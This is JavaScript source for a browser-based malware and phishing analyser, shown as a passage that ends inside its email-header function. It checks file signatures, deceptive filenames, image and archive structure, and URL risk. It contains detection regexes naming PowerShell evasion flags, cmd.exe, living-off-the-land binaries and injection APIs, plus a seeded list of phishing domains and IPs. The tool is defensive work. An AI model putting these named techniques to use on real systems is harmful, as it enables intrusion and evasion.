/* Moved out of index.html so the page runs under a CSP without 'unsafe-inline'. */
(function(){

const ROOT1 = window.document.getElementById("section-1");
const __realDoc_ROOT1 = window.document;
const document = new Proxy(__realDoc_ROOT1, {
  get(target, prop) {
    if (prop === "querySelector")    return (sel) => ROOT1.querySelector(sel);
    if (prop === "querySelectorAll") return (sel) => ROOT1.querySelectorAll(sel);
    if (prop === "getElementById")   return (id)  => ROOT1.querySelector("#" + CSS.escape(String(id)));
    const value = Reflect.get(target, prop);
    return typeof value === "function" ? value.bind(target) : value;
  },
  set(target, prop, value) { target[prop] = value; return true; }
});


"use strict";

/* ==================================================================
   World Monitor  -  core utilities
   All analysis runs locally in this browser. No network egress.
   ================================================================== */

const $  = (s,r=document)=>r.querySelector(s);
const $$ = (s,r=document)=>Array.from(r.querySelectorAll(s));
const esc = s => String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const pad = (n,w=2)=>String(n).padStart(w,'0');
const nowISO = ()=> new Date().toISOString().replace('T',' ').slice(0,19)+'Z';
const hhmmss = d => pad(d.getHours())+':'+pad(d.getMinutes())+':'+pad(d.getSeconds());
const sleep = ms => new Promise(r=>setTimeout(r,ms));

function fmtBytes(n){
  if(n<1024) return n+' B';
  if(n<1048576) return (n/1024).toFixed(1)+' KB';
  return (n/1048576).toFixed(2)+' MB';
}

/* Real SHA-256 via WebCrypto */
async function sha256(buf){
  const d = await crypto.subtle.digest('SHA-256', buf);
  return [...new Uint8Array(d)].map(b=>b.toString(16).padStart(2,'0')).join('');
}
async function sha256Text(t){ return sha256(new TextEncoder().encode(t)); }

/* CRC-32, used to validate PNG chunks for real */
const CRC_TBL = (()=>{ const t=new Uint32Array(256);
  for(let n=0;n<256;n++){ let c=n; for(let k=0;k<8;k++) c = c&1 ? 0xEDB88320^(c>>>1) : c>>>1; t[n]=c>>>0; }
  return t; })();
function crc32(bytes,start,len){
  let c=0xFFFFFFFF;
  for(let i=start;i<start+len;i++) c = CRC_TBL[(c^bytes[i])&0xFF] ^ (c>>>8);
  return (c^0xFFFFFFFF)>>>0;
}

/* Shannon entropy, 0..8 bits per byte */
function entropy(bytes,start=0,len=bytes.length){
  if(len<=0) return 0;
  const f=new Uint32Array(256);
  for(let i=start;i<start+len;i++) f[bytes[i]]++;
  let e=0;
  for(let i=0;i<256;i++){ if(!f[i]) continue; const p=f[i]/len; e -= p*Math.log2(p); }
  return e;
}
function entropyWindows(bytes,win=2048){
  const out=[];
  for(let i=0;i<bytes.length;i+=win){
    const l=Math.min(win,bytes.length-i);
    if(l<256) break;
    out.push({off:i,e:entropy(bytes,i,l)});
  }
  return out;
}

/* ---------- magic byte signatures ---------- */
const SIGS = [
  {sig:[0x4D,0x5A],                          type:'PE executable',      cat:'executable', ext:['exe','dll','scr','sys']},
  {sig:[0x7F,0x45,0x4C,0x46],                type:'ELF executable',     cat:'executable', ext:['elf','so','bin']},
  {sig:[0xCF,0xFA,0xED,0xFE],                type:'Mach-O executable',  cat:'executable', ext:['macho']},
  {sig:[0xFF,0xD8,0xFF],                     type:'JPEG image',         cat:'image',      ext:['jpg','jpeg','jfif']},
  {sig:[0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A], type:'PNG image',     cat:'image',      ext:['png']},
  {sig:[0x47,0x49,0x46,0x38],                type:'GIF image',          cat:'image',      ext:['gif']},
  {sig:[0x42,0x4D],                          type:'BMP image',          cat:'image',      ext:['bmp']},
  {sig:[0x25,0x50,0x44,0x46],                type:'PDF document',       cat:'document',   ext:['pdf']},
  {sig:[0x50,0x4B,0x03,0x04],                type:'ZIP archive',        cat:'archive',    ext:['zip','docx','xlsx','pptx','apk','jar','odt']},
  {sig:[0x52,0x61,0x72,0x21],                type:'RAR archive',        cat:'archive',    ext:['rar']},
  {sig:[0x37,0x7A,0xBC,0xAF],                type:'7-Zip archive',      cat:'archive',    ext:['7z']},
  {sig:[0x1F,0x8B],                          type:'GZIP archive',       cat:'archive',    ext:['gz','tgz']},
  {sig:[0xD0,0xCF,0x11,0xE0],                type:'MS Compound (OLE2)', cat:'document',   ext:['doc','xls','ppt','msi']},
  {sig:[0x49,0x44,0x33],                     type:'MP3 audio',          cat:'media',      ext:['mp3']},
  {sig:[0x00,0x00,0x01,0x00],                type:'ICO icon',           cat:'image',      ext:['ico']},
];
const EXT_MIME = {
  jpg:'image/jpeg',jpeg:'image/jpeg',png:'image/png',gif:'image/gif',bmp:'image/bmp',
  webp:'image/webp',svg:'image/svg+xml',ico:'image/x-icon',pdf:'application/pdf',
  zip:'application/zip',docx:'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  xlsx:'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  exe:'application/x-msdownload',txt:'text/plain',html:'text/html',eml:'message/rfc822'
};

function startsWith(bytes,sig,off=0){
  if(bytes.length < off+sig.length) return false;
  for(let i=0;i<sig.length;i++) if(bytes[off+i]!==sig[i]) return false;
  return true;
}
function detectType(bytes){
  if(startsWith(bytes,[0x52,0x49,0x46,0x46]) && startsWith(bytes,[0x57,0x45,0x42,0x50],8))
    return {type:'WEBP image',cat:'image',ext:['webp'],sigLen:12};
  for(const s of SIGS) if(startsWith(bytes,s.sig)) return {...s,sigLen:s.sig.length};
  const head = new TextDecoder('utf-8',{fatal:false}).decode(bytes.slice(0,600)).trim();
  if(/^<\?xml/i.test(head) && /<svg[\s>]/i.test(head)) return {type:'SVG image (XML)',cat:'active-image',ext:['svg'],sigLen:0};
  if(/^<svg[\s>]/i.test(head)) return {type:'SVG image (XML)',cat:'active-image',ext:['svg'],sigLen:0};
  if(/^<!doctype html|^<html/i.test(head)) return {type:'HTML document',cat:'active',ext:['html','htm'],sigLen:0};
  if(/^(#!|<\?php|MZ)/.test(head)) return {type:'Script / interpreted',cat:'active',ext:['sh','php'],sigLen:0};
  return {type:'Unrecognised / raw data',cat:'unknown',ext:[],sigLen:0};
}

/* ---------- filename deception ---------- */
const DANGEROUS_EXT = ['exe','scr','com','pif','bat','cmd','vbs','js','jse','wsf','hta','msi','jar','ps1','lnk','dll'];
function analyseFilename(name){
  const out={findings:[]};
  const parts = name.split('.');
  out.ext = parts.length>1 ? parts[parts.length-1].toLowerCase() : '';
  if(name.includes('\u202E')) out.findings.push({
    id:'RTLO', label:'Right-to-left override character in filename',
    ev:'U+202E at position '+name.indexOf('\u202E')+' - the name renders reversed to a human reader'});
  if(/[\u200B-\u200F\u2060\uFEFF]/.test(name)) out.findings.push({
    id:'ZWSP', label:'Zero-width characters in filename',
    ev:'Invisible codepoints present - name is not what it appears'});
  if(parts.length>2){
    const inner = parts[parts.length-2].toLowerCase();
    const known = ['jpg','jpeg','png','gif','pdf','doc','docx','xls','xlsx','txt','zip'];
    if(known.includes(inner) && DANGEROUS_EXT.includes(out.ext)) out.findings.push({
      id:'DBLEXT', label:'Double extension',
      ev:'.'+inner+' followed by executable extension .'+out.ext});
  }
  if(/[а-яА-ЯΑ-Ωα-ω]/.test(name.replace(/\.[^.]+$/,''))) out.findings.push({
    id:'HOMO', label:'Mixed-script characters in filename',
    ev:'Non-Latin lookalike characters present'});
  return out;
}

/* ---------- structural parsers (real byte walks) ---------- */
function parseJPEG(b){
  const r={format:'JPEG',segments:[],findings:[],trailing:0};
  let i=2, guard=0;
  while(i<b.length-1 && guard++<4000){
    if(b[i]!==0xFF){ r.findings.push({id:'JPEG_DESYNC',label:'Malformed JPEG segment chain',
      ev:'Expected marker 0xFF at offset '+i+', found 0x'+b[i].toString(16)}); break; }
    const m=b[i+1];
    if(m===0xD9){ r.eoi=i; break; }
    if(m===0xD8||(m>=0xD0&&m<=0xD7)){ i+=2; continue; }
    const len=(b[i+2]<<8)|b[i+3];
    if(len<2){ r.findings.push({id:'JPEG_LEN',label:'Invalid JPEG segment length',
      ev:'Segment 0xFF'+m.toString(16)+' declares length '+len}); break; }
    r.segments.push({marker:'FF'+m.toString(16).toUpperCase().padStart(2,'0'),off:i,len});
    if(m===0xE1) r.hasEXIF=true;
    if(m===0xDA){
      let e=-1; for(let k=b.length-2;k>i;k--) if(b[k]===0xFF&&b[k+1]===0xD9){e=k;break;}
      r.eoi=e; break;
    }
    i+=2+len;
  }
  if(r.eoi!=null && r.eoi>0){
    r.trailing = b.length - (r.eoi+2);
    if(r.trailing>0) r.findings.push({id:'TRAILING',label:'Data appended after end-of-image marker',
      ev:fmtBytes(r.trailing)+' present beyond the JPEG EOI marker at offset '+r.eoi});
  } else if(r.eoi==null){
    r.findings.push({id:'JPEG_NOEOI',label:'JPEG end-of-image marker missing',ev:'File is truncated or not a complete JPEG'});
  }
  return r;
}
function parsePNG(b){
  const r={format:'PNG',chunks:[],findings:[],trailing:0};
  let i=8, guard=0;
  while(i+8<=b.length && guard++<4000){
    const len=(b[i]<<24|b[i+1]<<16|b[i+2]<<8|b[i+3])>>>0;
    const name=String.fromCharCode(b[i+4],b[i+5],b[i+6],b[i+7]);
    if(i+12+len>b.length){ r.findings.push({id:'PNG_TRUNC',label:'PNG chunk exceeds file bounds',
      ev:'Chunk "'+name+'" declares '+len+' bytes at offset '+i}); break; }
    const stored=(b[i+8+len]<<24|b[i+9+len]<<16|b[i+10+len]<<8|b[i+11+len])>>>0;
    const calc=crc32(b,i+4,len+4);
    const ok = stored===calc;
    r.chunks.push({name,len,off:i,crcOK:ok});
    if(!ok) r.findings.push({id:'PNG_CRC',label:'PNG chunk checksum failure',
      ev:'Chunk "'+name+'" at offset '+i+' - stored CRC does not match computed CRC'});
    if(name==='IHDR'&&len>=8){ r.width=(b[i+8]<<24|b[i+9]<<16|b[i+10]<<8|b[i+11])>>>0;
      r.height=(b[i+12]<<24|b[i+13]<<16|b[i+14]<<8|b[i+15])>>>0; }
    i+=12+len;
    if(name==='IEND'){ r.iend=i; break; }
  }
  if(r.iend!=null){
    r.trailing=b.length-r.iend;
    if(r.trailing>0) r.findings.push({id:'TRAILING',label:'Data appended after end-of-image marker',
      ev:fmtBytes(r.trailing)+' present beyond the PNG IEND chunk at offset '+r.iend});
  }
  const odd=r.chunks.filter(c=>!['IHDR','PLTE','IDAT','IEND','tEXt','iTXt','zTXt','pHYs','tIME','gAMA','cHRM','sRGB','bKGD','tRNS','iCCP','sBIT','hIST','sPLT'].includes(c.name));
  if(odd.length) r.findings.push({id:'PNG_ODD',label:'Non-standard PNG chunk type',
    ev:odd.map(c=>c.name+' ('+c.len+' B)').join(', ')});
  return r;
}
function parseGIF(b){
  const r={format:'GIF',findings:[],trailing:0};
  let end=-1;
  for(let k=b.length-1;k>=0;k--) if(b[k]===0x3B){ end=k; break; }
  if(end>=0 && end<b.length-1){
    r.trailing=b.length-end-1;
    r.findings.push({id:'TRAILING',label:'Data appended after GIF trailer',
      ev:fmtBytes(r.trailing)+' present beyond the terminator at offset '+end});
  }
  return r;
}
function parseSVG(text){
  const r={format:'SVG',findings:[]};
  if(/<script[\s>]/i.test(text)) r.findings.push({id:'SVG_SCRIPT',label:'SVG contains an executable script element',
    ev:'<script> block present - this executes when the file is opened in a browser'});
  const ev=text.match(/\son(load|error|click|mouseover|animationstart|begin)\s*=/ig);
  if(ev) r.findings.push({id:'SVG_EVENT',label:'SVG contains inline event handlers',
    ev:[...new Set(ev.map(s=>s.trim()))].join(', ')});
  if(/javascript\s*:/i.test(text)) r.findings.push({id:'SVG_JSURI',label:'javascript: URI inside SVG',ev:'Scheme handler used as a link target'});
  if(/<foreignObject/i.test(text)) r.findings.push({id:'SVG_FO',label:'foreignObject element present',ev:'Permits arbitrary embedded HTML'});
  if(/<!ENTITY/i.test(text)) r.findings.push({id:'SVG_XXE',label:'XML entity declaration present',ev:'Possible external entity expansion'});
  if(/<(iframe|embed|object)[\s>]/i.test(text)) r.findings.push({id:'SVG_EMBED',label:'Embedded external content element',ev:'iframe/embed/object inside an image file'});
  return r;
}
function parsePDF(text){
  const r={format:'PDF',findings:[]};
  const checks=[
    [/\/JavaScript|\/JS\b/,'PDF_JS','Embedded JavaScript','/JavaScript or /JS action object present'],
    [/\/OpenAction/,'PDF_OA','Automatic action on open','/OpenAction executes without user interaction'],
    [/\/Launch/,'PDF_LAUNCH','Launch action','/Launch can invoke an external program'],
    [/\/EmbeddedFile/,'PDF_EMB','Embedded file stream','/EmbeddedFile carries another file inside the PDF'],
    [/\/AA\b/,'PDF_AA','Additional actions','/AA triggers on document or page events'],
    [/\/RichMedia|\/Flash/,'PDF_RM','Rich media object','Embedded multimedia handler'],
  ];
  for(const [re,id,label,ev] of checks) if(re.test(text)) r.findings.push({id,label,ev});
  return r;
}
function parseZIP(b,text){
  const r={format:'ZIP',entries:[],findings:[]};
  const dec=new TextDecoder('utf-8',{fatal:false});
  let i=0,guard=0;
  while(i<b.length-30 && guard++<800){
    if(!(b[i]===0x50&&b[i+1]===0x4B&&b[i+2]===0x03&&b[i+3]===0x04)){ i++; continue; }
    const csize=(b[i+18]|b[i+19]<<8|b[i+20]<<16|b[i+21]<<24)>>>0;
    const usize=(b[i+22]|b[i+23]<<8|b[i+24]<<16|b[i+25]<<24)>>>0;
    const nlen=b[i+26]|b[i+27]<<8, elen=b[i+28]|b[i+29]<<8;
    const name=dec.decode(b.slice(i+30,i+30+nlen));
    r.entries.push({name,csize,usize});
    i+=30+nlen+elen+csize;
    if(csize===0) i=Math.max(i,i+1);
  }
  const ratio = r.entries.reduce((a,e)=>a+e.usize,0) / Math.max(1,r.entries.reduce((a,e)=>a+e.csize,0));
  if(ratio>100) r.findings.push({id:'ZIP_BOMB',label:'Extreme compression ratio',
    ev:'Declared expansion ratio '+ratio.toFixed(0)+':1 - decompression guard triggered'});
  if(r.entries.some(e=>e.name.includes('../')||e.name.startsWith('/'))) r.findings.push({
    id:'ZIP_TRAV',label:'Path traversal in archive entry',ev:'Entry escapes the extraction directory'});
  if(r.entries.some(e=>/vbaProject\.bin$/i.test(e.name))) r.findings.push({
    id:'OOXML_VBA',label:'VBA macro project present',ev:'word/vbaProject.bin - the document carries macro code'});
  const danger=r.entries.filter(e=>DANGEROUS_EXT.includes((e.name.split('.').pop()||'').toLowerCase()));
  if(danger.length) r.findings.push({id:'ZIP_EXE',label:'Executable content inside archive',
    ev:danger.slice(0,4).map(e=>e.name).join(', ')});
  if(/oleObject|externalLink|attachedTemplate/i.test(text)) r.findings.push({
    id:'OOXML_EXT',label:'External relationship target',ev:'Document references remote content on open'});
  return r;
}

/* ---------- embedded / polyglot scan ---------- */
const EMBED_SIGS=[
  {b:[0x50,0x4B,0x03,0x04],n:'ZIP archive header'},
  {b:[0x4D,0x5A],n:'PE executable header'},
  {b:[0x7F,0x45,0x4C,0x46],n:'ELF executable header'},
  {b:[0x25,0x50,0x44,0x46],n:'PDF header'},
  {b:[0x52,0x61,0x72,0x21],n:'RAR archive header'},
  {b:[0x37,0x7A,0xBC,0xAF],n:'7-Zip archive header'},
];
function scanEmbedded(bytes,skipStart){
  const hits=[];
  for(const s of EMBED_SIGS){
    for(let i=Math.max(1,skipStart); i<bytes.length-s.b.length; i++){
      if(startsWith(bytes,s.b,i)){ hits.push({name:s.n,off:i}); break; }
    }
  }
  return hits;
}
function extractStrings(bytes,min=6,cap=400000){
  const out=[]; let cur='';
  const lim=Math.min(bytes.length,cap);
  for(let i=0;i<lim;i++){
    const c=bytes[i];
    if(c>=32&&c<=126){ cur+=String.fromCharCode(c); }
    else { if(cur.length>=min) out.push(cur); cur=''; }
  }
  if(cur.length>=min) out.push(cur);
  return out;
}
const SUS_STRINGS=[
  [/powershell(\.exe)?\s+-(enc|e|nop|w\s+hidden|exec)/i,'PowerShell execution with evasion flags'],
  [/cmd\.exe\s*\/c/i,'Command shell invocation'],
  [/(certutil|bitsadmin|mshta|regsvr32|rundll32)\b/i,'Living-off-the-land binary reference'],
  [/CreateRemoteThread|VirtualAlloc|WriteProcessMemory|LoadLibrary/i,'Process injection API reference'],
  [/This program cannot be run in DOS mode/i,'DOS stub string - confirms PE executable'],
  [/eval\s*\(|document\.write\s*\(|unescape\s*\(/i,'Dynamic code evaluation'],
  [/[A-Za-z0-9+/]{220,}={0,2}/,'Long base64-encoded blob'],
  [/\\x[0-9a-f]{2}(\\x[0-9a-f]{2}){20,}/i,'Long hex-escaped byte sequence'],
];
const RE_URL=/https?:\/\/[^\s"'<>)\]]{6,120}/gi;
const RE_IP=/\b(?:\d{1,3}\.){3}\d{1,3}\b/g;

;

"use strict";

/* ==================================================================
   RISK ENGINE - deterministic. Every point maps to a named indicator.
   ================================================================== */
const RISK = {
  MAGIC_EXEC:   {pts:60,tier:'det',label:'File signature is an executable while the extension claims an image'},
  KNOWN_HASH:   {pts:60,tier:'det',label:'SHA-256 matches a known malicious hash'},
  RTLO:         {pts:45,tier:'det',label:'Right-to-left override in filename'},
  DBLEXT:       {pts:45,tier:'det',label:'Double extension ending in an executable type'},
  SVG_SCRIPT:   {pts:45,tier:'det',label:'SVG carries an executable script'},
  POLYGLOT:     {pts:35,tier:'det',label:'Secondary file signature found at a non-zero offset'},
  MIME_MISMATCH:{pts:30,tier:'det',label:'Declared MIME type contradicts the file signature'},
  TRAILING:     {pts:25,tier:'det',label:'Data appended after the end-of-image marker'},
  DOMAIN_NEW:   {pts:25,tier:'heu',label:'Registrable domain is less than 30 days old'},
  BRAND_SUB:    {pts:25,tier:'heu',label:'Brand name appears in the subdomain but not the registrable domain'},
  CRED_FORM:    {pts:20,tier:'heu',label:'Credential form served from a non-brand domain'},
  AUTH_FAIL:    {pts:20,tier:'heu',label:'SPF, DKIM or DMARC evaluation failed'},
  STRUCT:       {pts:20,tier:'heu',label:'Structural anomaly or checksum failure'},
  SUS_STRING:   {pts:15,tier:'heu',label:'Suspicious strings present'},
  ENTROPY:      {pts:10,tier:'sta',label:'Abnormal high-entropy region'},
  STEGO:        {pts: 5,tier:'sta',label:'Statistical indicator consistent with hidden data'},
  ZWSP:         {pts:15,tier:'det',label:'Zero-width characters in filename'},
  HOMO:         {pts:15,tier:'heu',label:'Mixed-script lookalike characters'},
  ACTIVE_DOC:   {pts:30,tier:'det',label:'Document carries auto-executing or macro content'},
  ZIP_EXE:      {pts:30,tier:'det',label:'Executable content inside an archive'},
  ZIP_BOMB:     {pts:25,tier:'heu',label:'Decompression guard triggered'},
  IP_LITERAL:   {pts:20,tier:'heu',label:'IP address used in place of a hostname'},
  PUNYCODE:     {pts:25,tier:'heu',label:'Punycode or mixed-script hostname'},
  TYPOSQUAT:    {pts:30,tier:'heu',label:'Registrable domain is a near-match of a known brand'},
  SHORTENER:    {pts:10,tier:'heu',label:'URL shortener conceals the destination'},
  SUS_TLD:      {pts:10,tier:'heu',label:'Top-level domain frequently abused in phishing'},
  AT_SYMBOL:    {pts:20,tier:'heu',label:'@ in URL - text before it is discarded by the browser'},
  URL_STRUCT:   {pts:10,tier:'heu',label:'Anomalous URL structure'},
  REPLYTO:      {pts:20,tier:'heu',label:'Reply-To domain differs from From domain'},
  DISPLAY_SPOOF:{pts:25,tier:'heu',label:'Display name impersonates a brand the sending domain does not own'},
};
const TIER_NAME={det:'Deterministic',heu:'Heuristic',sta:'Statistical'};

function band(score){
  if(score>=75) return {key:'crit',label:'CRITICAL',verdict:'MALICIOUS',cls:'pill--crit',color:'#C4453F'};
  if(score>=50) return {key:'high',label:'HIGH RISK',verdict:'HIGH RISK',cls:'pill--high',color:'#D9534F'};
  if(score>=25) return {key:'susp',label:'SUSPICIOUS',verdict:'SUSPICIOUS',cls:'pill--susp',color:'#D6A029'};
  return {key:'safe',label:'LOW',verdict:'SAFE',cls:'pill--safe',color:'#4CAF6A'};
}
function scoreOf(inds){ return Math.min(100, inds.reduce((a,i)=>a+i.pts,0)); }

/* ==================================================================
   SEEDED INTELLIGENCE  - clearly labelled, never presented as live
   ================================================================== */
const IOC_DB=[
  {ind:'login-alert.xyz',type:'domain',rep:'malicious',campaign:'PONDSKATER',first:'2026-08-15',sight:412,note:'Credential harvesting infrastructure impersonating Indian retail banks'},
  {ind:'sbi-secure-verify.login-alert.xyz',type:'domain',rep:'malicious',campaign:'PONDSKATER',first:'2026-08-15',sight:398,note:'Lookalike host serving a cloned netbanking login page'},
  {ind:'185.243.115.84',type:'ip',rep:'malicious',campaign:'PONDSKATER',first:'2026-08-14',sight:266,note:'Hosting node, bulletproof provider, no legitimate services observed'},
  {ind:'update-cdn.click',type:'domain',rep:'malicious',campaign:'PONDSKATER',first:'2026-08-16',sight:187,note:'Second-stage payload delivery host'},
  {ind:'103.224.182.251',type:'ip',rep:'suspicious',campaign:'-',first:'2026-06-02',sight:44,note:'Shared hosting, mixed reputation'},
  {ind:'secure-docs-verify.top',type:'domain',rep:'malicious',campaign:'KITEWING',first:'2026-07-28',sight:151,note:'Document-themed credential phishing'},
  {ind:'icicl-netbanking.info',type:'domain',rep:'malicious',campaign:'PONDSKATER',first:'2026-08-11',sight:97,note:'Typosquat of a major Indian bank domain'},
  {ind:'cdn-jquery-min.su',type:'domain',rep:'suspicious',campaign:'-',first:'2026-05-19',sight:63,note:'Script host mimicking a CDN name'},
];
const HASH_DB={};
const DOMAIN_INTEL={
  'login-alert.xyz':      {owner:null, ageDays:4,   tls:'Let\'s Encrypt, issued 4 days ago', mx:false, credForm:true,  faviconBrand:'State Bank of India', redirects:2},
  'update-cdn.click':     {owner:null, ageDays:3,   tls:'Let\'s Encrypt, issued 3 days ago', mx:false, credForm:false, faviconBrand:null, redirects:1},
  'secure-docs-verify.top':{owner:null,ageDays:22,  tls:'Let\'s Encrypt, issued 22 days ago',mx:false, credForm:true,  faviconBrand:'Microsoft', redirects:0},
  'icicl-netbanking.info':{owner:null, ageDays:8,   tls:'Self-signed',                       mx:false, credForm:true,  faviconBrand:'ICICI Bank', redirects:1},
  'onlinesbi.sbi':        {owner:'State Bank of India', ageDays:4380,tls:'DigiCert EV, issued 210 days ago', mx:true, credForm:true, faviconBrand:'State Bank of India', redirects:0},
  'github.com':           {owner:'GitHub', ageDays:6500,tls:'DigiCert, issued 90 days ago',  mx:true,  credForm:true,  faviconBrand:'GitHub', redirects:0},
  'irctc.co.in':          {owner:'IRCTC',  ageDays:8200,tls:'Sectigo, issued 140 days ago',  mx:true,  credForm:true,  faviconBrand:'IRCTC', redirects:0},
};
const BRANDS=[
  {name:'State Bank of India',domain:'onlinesbi.sbi',kw:['sbi','onlinesbi','statebank']},
  {name:'ICICI Bank',domain:'icicibank.com',kw:['icici','icicibank']},
  {name:'HDFC Bank',domain:'hdfcbank.com',kw:['hdfc','hdfcbank']},
  {name:'Microsoft',domain:'microsoft.com',kw:['microsoft','office365','outlook']},
  {name:'Google',domain:'google.com',kw:['google','gmail']},
  {name:'IRCTC',domain:'irctc.co.in',kw:['irctc']},
  {name:'Income Tax India',domain:'incometax.gov.in',kw:['incometax','itrfiling']},
  {name:'Paytm',domain:'paytm.com',kw:['paytm']},
];
const SUS_TLDS=['xyz','top','click','tk','ml','ga','cf','gq','su','buzz','icu','rest','cam','info','online','live'];
const SHORTENERS=['bit.ly','tinyurl.com','t.co','goo.gl','ow.ly','is.gd','cutt.ly','rb.gy','shorturl.at'];

function levenshtein(a,b){
  const m=a.length,n=b.length; if(!m)return n; if(!n)return m;
  let prev=Array.from({length:n+1},(_,j)=>j), cur=new Array(n+1);
  for(let i=1;i<=m;i++){ cur[0]=i;
    for(let j=1;j<=n;j++) cur[j]=Math.min(prev[j]+1,cur[j-1]+1,prev[j-1]+(a[i-1]===b[j-1]?0:1));
    [prev,cur]=[cur,prev];
  }
  return prev[n];
}
function registrable(host){
  const p=host.split('.');
  const two=['co.in','co.uk','com.au','gov.in','net.in','org.in','ac.in','com.br'];
  if(p.length>=3 && two.includes(p.slice(-2).join('.'))) return p.slice(-3).join('.');
  return p.slice(-2).join('.');
}

/* ==================================================================
   PHISHING URL ENGINE
   ================================================================== */
function analyseURL(raw){
  const inds=[], feats=[];
  let u;
  try{ u=new URL(raw.trim()); }catch(e){ return {error:'That is not a parseable URL. Include the scheme, for example https://example.com/path'}; }
  const host=u.hostname.toLowerCase();
  const reg=registrable(host);
  const sub=host.slice(0,Math.max(0,host.length-reg.length-1));
  const tld=reg.split('.').pop();
  const F=(k,v,flag)=>feats.push({k,v,flag:!!flag});

  F('Scheme',u.protocol.replace(':',''), u.protocol!=='https:');
  F('Hostname',host);
  F('Registrable domain',reg);
  F('Subdomain',sub||'(none)');
  F('Path depth',String(u.pathname.split('/').filter(Boolean).length));
  F('URL length',String(raw.length), raw.length>75);
  F('Hyphens in host',String((host.match(/-/g)||[]).length), (host.match(/-/g)||[]).length>=2);
  F('Digit ratio in host',((host.replace(/\D/g,'').length/host.length)*100).toFixed(0)+'%');

  if(/^\d{1,3}(\.\d{1,3}){3}$/.test(host)){
    inds.push({...RISK.IP_LITERAL,id:'IP_LITERAL',ev:'Host is the literal address '+host});
  }
  if(host.startsWith('xn--')||host.includes('.xn--')||/[а-яА-ЯΑ-Ωα-ω]/.test(host)){
    inds.push({...RISK.PUNYCODE,id:'PUNYCODE',ev:'Hostname uses punycode or non-Latin script: '+host});
  }
  if(raw.includes('@')){
    inds.push({...RISK.AT_SYMBOL,id:'AT_SYMBOL',ev:'Everything before @ is credentials, not the destination'});
  }
  if(SUS_TLDS.includes(tld)){
    inds.push({...RISK.SUS_TLD,id:'SUS_TLD',ev:'.'+tld+' is disproportionately represented in phishing corpora'});
  }
  if(SHORTENERS.includes(reg)){
    inds.push({...RISK.SHORTENER,id:'SHORTENER',ev:reg+' hides the true destination until resolved'});
  }
  if(raw.split('http').length>2){
    inds.push({...RISK.URL_STRUCT,id:'URL_STRUCT',ev:'A second URL is embedded inside the path or query'});
  }
  if(host.split('.').length>4){
    inds.push({...RISK.URL_STRUCT,id:'URL_STRUCT2',ev:'Unusually deep subdomain nesting: '+host.split('.').length+' labels'});
  }

  let brandHit=null;
  for(const b of BRANDS){
    const inSub = b.kw.some(k=>sub.includes(k)||u.pathname.toLowerCase().includes('/'+k));
    const inReg = b.kw.some(k=>reg.includes(k));
    if(inSub && !inReg){ brandHit=b;
      inds.push({...RISK.BRAND_SUB,id:'BRAND_SUB',ev:'"'+b.name+'" referenced outside the registrable domain - the browser trusts '+reg+', not '+sub});
      break;
    }
  }
  const regName=reg.split('.')[0];
  const tokens=[...new Set([regName,...regName.split('-')])].filter(t=>t.length>=3);
  outer: for(const b of BRANDS){
    const targets=[...new Set([b.domain.split('.')[0],...b.kw])].filter(x=>x.length>=4);
    for(const bn of targets)
    for(const t of tokens){
      if(t===bn) continue;
      const d=levenshtein(t,bn);
      if(d>0 && d<=2 && Math.abs(t.length-bn.length)<=2){
        inds.push({...RISK.TYPOSQUAT,id:'TYPOSQUAT',
          ev:'"'+t+'" is edit-distance '+d+' from "'+bn+'" ('+b.name+') - a human reading quickly will not notice'});
        brandHit=brandHit||b; break outer;
      }
    }
  }

  const intel=DOMAIN_INTEL[reg];
  if(intel){
    F('Domain age',intel.ageDays<365?intel.ageDays+' days':Math.floor(intel.ageDays/365)+' years',intel.ageDays<30);
    F('TLS certificate',intel.tls,/Self-signed|issued \d+ days? ago/.test(intel.tls)&&intel.ageDays<30);
    F('MX records',intel.mx?'present':'absent',!intel.mx);
    F('Redirect chain',intel.redirects+' hop'+(intel.redirects===1?'':'s'),intel.redirects>1);
    if(intel.ageDays<30) inds.push({...RISK.DOMAIN_NEW,id:'DOMAIN_NEW',ev:reg+' was registered '+intel.ageDays+' days ago'});
    const owner = intel.owner || (BRANDS.find(b=>b.domain===reg)||{}).name || null;
    F('Domain owner', owner || 'unattributed', !owner);
    if(intel.credForm){
      if(!owner) inds.push({...RISK.CRED_FORM,id:'CRED_FORM',
        ev:'Password input served from '+reg+', a domain no known brand is recorded as owning'});
      F('Credential form','present',!owner);
    }
    if(intel.faviconBrand && intel.faviconBrand!==owner){
      inds.push({pts:25,tier:'heu',label:'Favicon matches a brand the domain does not own',
        id:'FAVICON',ev:'Perceptual hash of the site favicon matches "'+intel.faviconBrand+'" while the domain is '+reg});
      F('Favicon match',intel.faviconBrand+' (mismatched)',true);
    } else if(intel.faviconBrand){
      F('Favicon match',intel.faviconBrand+' (consistent)');
    }
  } else {
    F('Domain age','not in local dataset');
    F('Infrastructure','offline - seeded records only');
  }

  const iocHit=IOC_DB.find(i=>i.ind===host||i.ind===reg);
  if(iocHit && iocHit.rep==='malicious'){
    inds.push({pts:60,tier:'det',id:'IOC_MATCH',label:'Indicator matches a known malicious record',
      ev:iocHit.ind+' - campaign '+iocHit.campaign+', first seen '+iocHit.first});
  }

  const score=scoreOf(inds), b=band(score);
  return {kind:'url',target:raw,host,reg,feats,inds,score,band:b,brand:brandHit,ioc:iocHit,intel};
}

/* ==================================================================
   EMAIL HEADER ENGINE
   ================================================================== */
function analyseEML(text){
  const inds=[],feats=[];
  const get=n=>{ const m=text.match(new RegExp('^'+n+':\\s*(.+(?:\\n[ \\t].+)*)','im')); return m?m[1].replace(/\n[ \\t]+/g,' ').trim():null; };
  const from=get('From')||'', replyTo=get('Reply-To')||'', subject=get('Subject')||'(no subject)';
  const auth=get('Authentication-Results')||'', returnPath=get('Return-Path')||'';
  const addr=s=>{ const m=s.match(/<([^>]+)>/)||s.match(/([\w.+-]+@[\w.-]+)/); return m?m[1]:''; };
  const dom=s=>{ const a=addr(s); return a.includes('@')?a.split('@')[1].toLowerCase():''; };
  const fromDom=dom(from), rtDom=dom(replyTo);
  const display=(from.split('<')[0]||'').replace(/["']/g,'').trim();

  feats.push({k:'From',v:from||'(absent)'});
  feats.push({k:'Return-Path',v:returnPath||'(absent)'});
  feats.push({k:'Reply-To',v:replyTo||'(absent)'});
  feats.push({k:'Subject',v:subject});

  const spf=(auth.match(/spf=(\w+)/i)||[])[1]||'none';
